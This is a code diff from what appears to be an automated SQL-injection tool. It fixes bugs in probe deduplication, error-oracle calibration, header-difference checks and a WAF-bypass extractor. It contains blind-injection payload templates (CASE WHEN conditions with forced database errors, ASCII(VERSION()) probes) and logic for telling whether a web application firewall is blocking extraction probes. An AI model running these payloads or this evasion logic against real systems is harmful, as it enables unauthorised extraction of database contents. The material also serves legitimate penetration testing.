@@ -31695,7 +31695,13 @@ async def _send_injected(engine:HTTPEngine, method:str, url:str,
             # This is why BH/TH/EH show only "testing..." with zero status output.
             # Fix: include the extra_headers payload in the dedup key so each probe
             # (different SQL in rotating header) produces a unique key.
-            _dedup_value = (value or '') + (
+            # BUG-DEDUP-CROSS-SURFACE-SUPPRESSION FIX: method (GET vs POST) was not
+            # included in the dedup key.  When the GET surface scans the same param with
+            # EH, the key (param, 'B', 'fr|hdr:[...]') collides with the already-seen
+            # POST probe → the first 20 GET EH probes are silently dedup-suppressed and
+            # no output is produced (bypasses the EH empty-body print fix too).
+            # Fix: prepend the HTTP method so GET and POST probes never share a key.
+            _dedup_value = (method or '') + ':' + (value or '') + (
                 '|hdr:' + str(sorted((extra_headers or {}).items()))
                 if extra_headers else ''
             )
@@ -128083,8 +128089,11 @@ class MultiStrategyExtractor:
                 if fp_e and fp_o and hasattr(fp_e, "headers") and hasattr(fp_o, "headers"):
                     _eh = dict(getattr(fp_e, "headers", {}) or {})
                     _oh = dict(getattr(fp_o, "headers", {}) or {})
+                    # BUG-MSE-X-REQUEST-ID FIX: x-request-id removed — per-request UUID
+                    # always differs between two requests → always sets _hdr_diff=True →
+                    # false error oracle (same logic as BUG-NEW-B in PCV Check D).
                     for _hk in ("x-upstream-status", "x-error", "x-debug", "via",
-                                "x-powered-by", "x-request-id", "content-type"):
+                                "x-powered-by", "content-type"):
                         if _eh.get(_hk, "") != _oh.get(_hk, ""):
                             _hdr_diff = True
                             print(f"[MSE]   err({_name}): header diff on {_hk!r}", flush=True)
@@ -145842,11 +145851,16 @@ class NovelWAFBypassExtractor:
             fp_normal, _ = await send_fn("1=1")
             inflated_len = getattr(fp_inflated, "content_length", 0)
             normal_len = getattr(fp_normal, "content_length", 0)
-            if abs(inflated_len - normal_len) > 100:
+            # BUG-TCP-INFLATION-REVERSED FIX: abs() accepted inflated < normal (WAF-blocked
+            # inflate payload returns small error page) as "viable".  inflated=155, normal=557
+            # → abs(155-557)=402 > 100 → false "viable".  Require inflated > normal so a
+            # WAF-blocked inflate (small response) is correctly reported as not viable.
+            if inflated_len > normal_len and (inflated_len - normal_len) > 100:
                 print("[+] [Novel]  TCP inflation viable: inflated=%d normal=%d" % (inflated_len, normal_len,))
-                # Can use as boolean oracle
+                # NOTE: extraction via TCP inflation is not yet implemented; this branch
+                # records viability only and does not contribute to data extraction.
             else:
-                print("[+] [Novel]  TCP inflation not viable (WAF strips body)")
+                print("[+] [Novel]  TCP inflation not viable (inflated=%d normal=%d)" % (inflated_len, normal_len,))
         except Exception as e:
             LOG.debug("[Novel] TCP inflation: %s", e)
 
@@ -146441,14 +146455,21 @@ class ConditionalErrorTypeOracle:
     async def calibrate(cls, send_fn, dbms: str, delay: float = 0.5):
         """Find which error type produces a distinguishable response."""
         import asyncio
-        fp_clean, _ = await send_fn("1")
-        clean_status = getattr(fp_clean, "status_code", 0)
-        clean_len = getattr(fp_clean, "content_length", 0)
-        await asyncio.sleep(delay)
-
+        # BUG-ERRTYPE-CALIBRATION-FORMAT-MISMATCH FIX: calibration must use the same
+        # CASE WHEN wrapper that build_conditional_error/extraction uses.  The old code
+        # sent raw "1" and raw error-expr to calibrate, but extraction always wraps in
+        # "CASE WHEN ({cond}) THEN 1 ELSE ({eexpr}) END".  If the WAF blocks the CASE
+        # WHEN form while passing the raw expressions, all extraction probes return the
+        # "no-error" response size → every bit reads True → garbage Unicode output.
         errors = cls.ERROR_TYPES.get(dbms, {"div_zero": "1/0"})
         for etype, eexpr in errors.items():
-            fp_err, _ = await send_fn(eexpr)
+            clean_probe = f"CASE WHEN (1=1) THEN 1 ELSE ({eexpr}) END"
+            error_probe = f"CASE WHEN (1=2) THEN 1 ELSE ({eexpr}) END"
+            fp_clean, _ = await send_fn(clean_probe)
+            clean_status = getattr(fp_clean, "status_code", 0)
+            clean_len = getattr(fp_clean, "content_length", 0)
+            await asyncio.sleep(delay)
+            fp_err, _ = await send_fn(error_probe)
             err_status = getattr(fp_err, "status_code", 0)
             err_len = getattr(fp_err, "content_length", 0)
             await asyncio.sleep(delay)
@@ -146459,6 +146480,23 @@ class ConditionalErrorTypeOracle:
                 _eo_max = max(err_len, clean_len, 1)
                 _eo_pct = abs(err_len - clean_len) / _eo_max
                 if _eo_pct >= 0.10 or _eo_max < 5000:
+                    # BUG-ERRTYPE-ORACLE-WAF-COLLISION FIX: calibration with 1=1/1=2
+                    # passes because simple arithmetic isn't WAF-flagged, but extraction
+                    # probes contain ASCII(SUBSTRING(...)...) which modern WAFs detect.
+                    # When WAF blocks extraction probes, the block-page content_length
+                    # can equal clean_len (true_sig).  Every probe then returns True →
+                    # all bits set → garbage Unicode output (e.g. U+FE9C7).
+                    # Fix: send a probe with real SQL function keywords (ASCII, VERSION)
+                    # in a known-FALSE condition.  It should return err_len (error page).
+                    # If it returns clean_len instead, the WAF is blocking function-keyword
+                    # payloads with a response the same size as our true_sig → oracle
+                    # unreliable for this error type → skip to next.
+                    _waf_check = f"CASE WHEN (ASCII(VERSION())=0) THEN 1 ELSE ({eexpr}) END"
+                    _fp_waf, _ = await send_fn(_waf_check)
+                    _waf_len = getattr(_fp_waf, "content_length", 0)
+                    if abs(_waf_len - clean_len) < 20:
+                        # WAF blocked the complex probe and returned true_sig-sized response
+                        continue
                     return etype, clean_len, err_len, "length"
 
         return None
